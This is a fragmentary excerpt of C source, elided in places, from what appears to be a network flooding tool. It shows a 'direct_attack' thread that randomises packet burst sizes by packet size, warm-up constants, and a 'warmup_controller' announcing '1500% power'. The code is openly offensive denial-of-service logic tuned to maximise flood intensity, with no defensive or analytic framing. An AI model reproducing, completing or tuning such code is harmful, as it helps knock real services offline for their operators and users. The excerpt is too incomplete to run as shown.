...
#define WARMUP_BURST_MULTIPLIER 15
#define WARMUP_SLEEP_DIVIDER 15
...
void *direct_attack(void *arg) {
    ...
    int optimal_burst;
    if (PACKET_SIZE <= 40) {
        optimal_burst = 650 + (rand() % 300);
    } else if (PACKET_SIZE <= 60) {
        optimal_burst = 500 + (rand() % 250);
    } else {
        optimal_burst = 350 + (rand() % 200);
    }
...
void *warmup_controller(void *arg) {
    printf("⚡ Warm-up: %d seconds (1500%% power)...\n", WARMUP_SECONDS);
